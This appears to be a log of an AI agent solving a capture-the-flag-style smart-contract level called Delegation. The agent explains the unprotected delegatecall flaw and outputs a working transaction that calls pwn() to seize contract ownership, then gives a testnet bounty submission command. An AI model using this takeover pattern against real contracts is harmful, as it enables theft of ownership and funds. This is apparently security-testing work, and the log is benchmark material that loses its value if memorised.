# Hunter agent run — delegation — deepseek-ai/DeepSeek-V4.1-Flash-1017 (provider: nearai; NEAR AI Cloud only if nearai) — 2026-11-07

## Turn 1 — model reply (verbatim)

The bug is the unprotected `delegatecall` in `Delegation`’s fallback, which executes `Delegate` code in the `Delegation` storage context. Calling the instance with the `pwn()` selector makes the delegatecall set slot 0 (`owner`) to `msg.sender`, the player.

```json
[
  {
    "to": "0x1780ddd8723ddc88d5def27cc1dfb16a73077434",
    "data": "0xdd365b8b",
    "value": "0"
  }
]
```

### Turn 1 — local verifier (committed verifier.wasm, wasmtime)

```
tx 1: success
validateInstance → 1
broken: True
```

**Result: invariant broken on turn 1.**

Next step on testnet (needs a funded hunter account and an open bounty on this invariant):
`python3 scripts/hunter.py --bounty <bounty> --hunter <account> --exploit hunter-agent/delegation-deepseek-ai_DeepSeek-V4.1-Flash-1017-exploit.json --label agent-delegation --invariant delegation-owner-taken`
